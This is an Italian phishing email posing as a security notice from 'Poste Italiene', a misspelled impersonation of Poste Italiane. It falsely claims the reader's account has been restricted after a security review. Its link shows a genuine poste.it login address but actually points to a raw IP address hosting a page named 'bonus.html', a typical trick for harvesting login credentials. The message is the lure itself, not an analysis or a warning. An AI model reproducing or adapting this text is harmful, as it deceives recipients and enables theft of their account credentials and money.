 Gentile Cliente, Nell'ambito delle misure di sicurezza da noi adottate, controlliamo costantemente le attività del sistema. Durante una recente verifica, abbiamo rilevato un problema riguardante il tuo conto. Abbiamo deciso di limitare l'accesso al tuo conto fino a quando non verrà completata l'implementazione di misure di sicurezza aggiuntive. Per controllare il tuo conto e le informazioni che Poste Italiene ha utilizzato per decretare di limitare l'accesso al conto, visita il seguente sito: https://www.poste.it/online/personale/login-home.fcc (http://70.107.243.197/CitrixAccess/bonus.html) Se, dopo aver controllato le informazioni sul conto, desideri ulteriori chiarimenti riguardo all'accesso al conto, contatta il modulo Contattaci nell'Aiuto. Nel ringraziarti per la collaborazione, ti ricordiamo che questa è una misura di sicurezza il cui scopo è quello di garantire la tutela degli utenti e dei conti. Ci scusiamo per gli eventuali disagi. Cordiali saluti, Assistenza clienti Poste Italiene 